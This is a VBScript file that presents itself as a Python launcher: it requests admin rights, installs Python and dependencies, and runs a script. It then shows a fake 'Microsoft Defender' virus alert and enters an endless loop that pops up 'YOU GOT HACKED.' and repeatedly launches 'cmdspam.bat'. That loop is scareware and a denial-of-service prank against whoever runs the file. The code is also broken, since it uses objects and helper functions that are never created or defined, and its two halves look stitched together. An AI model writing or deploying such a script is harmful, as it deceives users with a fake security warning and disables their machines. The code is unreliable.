Option Explicit

Dim objShell, objFSO, strScriptPath, strPythonScript, strRequirements
Dim pythonPath

strScriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
strPythonScript = strScriptPath & "\your_script.py"
strRequirements = strScriptPath & "\requirements.txt"

If Not IsAdmin() Then
    RequestAdmin()
End If

pythonPath = GetPythonPath()

If pythonPath = "" Then
    InstallPython()
    WScript.Sleep 5000
    pythonPath = GetPythonPath()
    If pythonPath = "" Then
        MsgBox "Python installation failed. Please restart and try again.", vbCritical
        WScript.Quit
    End If
End If
If objFSO.FileExists(strRequirements) Then
    InstallDependencies pythonPath, strRequirements
End If
LaunchPythonScript pythonPath, strPythonScript

Function ShowWarning()
    MsgBox "YOU GOT HACKED.", vbOKOnly + vbInformation, "COOKED"
End Function
Set sh = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Msgbox "Virus Detected! Press OK to quarantine", vbExclamation, "Microsoft Defender"

Do While True
Call ShowWarning()
sh.Run "cmdspam.bat", 1, False
Loop